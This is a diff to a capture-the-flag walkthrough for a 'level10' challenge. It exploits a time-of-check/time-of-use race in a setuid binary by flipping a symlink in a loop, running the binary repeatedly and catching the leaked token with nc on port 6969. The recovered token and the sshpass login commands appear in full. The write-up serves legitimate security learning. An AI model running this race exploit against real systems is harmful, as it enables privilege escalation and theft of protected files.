@@ -13,12 +13,23 @@
 	.bash_logout  .bashrc  .profile  level10  token
 	```
 
-3. __Action__ (Guest): check the file access control list of both `level10` and `token` files
+3. __Action__ (Guest): check the type of the `level10` file
+	```sh
+	file -b level10
+	```
+
+4. __Observation__ (Guest): the previous command reveals that the `level10` file
+	is an ELF 32-bits executable
+	```
+	setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf7e21fb68568fa57d6317d0535b97d9fca66f841, not stripped
+	```
+
+5. __Action__ (Guest): check the file access control list of both `level10` and `token` files
 	```sh
 	getfacl level10 token
 	```
 
-4. __Observation__ (Guest): the previous command reveals that:
+6. __Observation__ (Guest): the previous command reveals that:
 	- the `level10` file:
 		- is readable by the `level10` user
 		- is executable by the `level10` user
@@ -48,16 +59,16 @@
 	other::---
 	```
 
-5. __Action__ (Host): copy the `level10` file from the virtual machine
+7. __Action__ (Host): copy the `level10` file from the virtual machine
 	```sh
 	sshpass -f level09/flag \
-		scp -P 4242 level10@192.168.122.214:level10 .
+		scp -P 4242 level10@192.168.122.214:level10 /tmp
 	```
 
-6. __Action__ (Host): decompile the `level10` file using [dogbolt](https://dogbolt.org/)
+8. __Action__ (Host): decompile the `level10` file using [dogbolt](https://dogbolt.org/)
 	and manually improve the lisibility of the decompiled code
 
-7. __Observation__ (Host): after reverse engineering the `level10` file, we obtain the following
+9. __Observation__ (Host): after reverse engineering the `level10` file, we obtain the following
 	C code, which takes a filename and a hostname as arguments, checks the access to the file
 	by the user, connects to the host on port `6969`, sends a banner message, reads the content
 	of the file and sends it to the connected host
@@ -133,37 +144,42 @@
 	opening the file to manipulate it.
 	```
 
-10. __Action__ (Guest): create a symbolic link that points alternatively to the `token` file
+10. __Action__ (Host): remove the `level10` file
+	```sh
+	rm /tmp/level10
+	```
+
+11. __Action__ (Guest): create a symbolic link that points alternatively to the `token` file
 	and the `null` file located in the `/dev` directory
 	```sh
 	while true; do ln -fs ~/token /tmp/symlink; ln -fs /dev/null /tmp/symlink; done &
 	```
 
-11. __Action__ (Guest): execute repeatedly the `level10` file with the `symlink` file
+12. __Action__ (Guest): execute repeatedly the `level10` file with the `symlink` file
 	as the first argument and the localhost IP address as the second argument
 	```sh
 	while true; do /home/user/level10/level10 /tmp/symlink 127.0.0.1; done >/dev/null &
 	```
 
-12. __Action__ (Guest): listen on the port `6969` for the first non-banner message
+13. __Action__ (Guest): listen on the port `6969` for the first non-banner message
 	```sh
 	nc -lk 6969 | grep -m 1 -v '.*( )*.'
 	```
 
-13. __Observation__ (Guest C): the content of the `token` file appears on stdout:  
+14. __Observation__ (Guest C): the content of the `token` file appears on stdout:  
 	`woupa2yuojeeaaed06riuj63c`
 
-14. __Action__ (Guest): terminate the running subprocesses
+15. __Action__ (Guest): terminate the running subprocesses
 	```sh
 	pkill -P $$
 	```
 
-15. __Action__ (Guest): remove the `symlink` symbolic link and the `empty` file
+16. __Action__ (Guest): remove the `symlink` symbolic link and the `empty` file
 	```sh
 	rm /tmp/{'symlink','empty'}
 	```
 
-16. __Action__ (Host): run the `getflag` command as the `flag10` user
+17. __Action__ (Host): run the `getflag` command as the `flag10` user
 	and save the token in the `flag` file
 	```sh
 	sshpass -p woupa2yuojeeaaed06riuj63c 2>/dev/null \
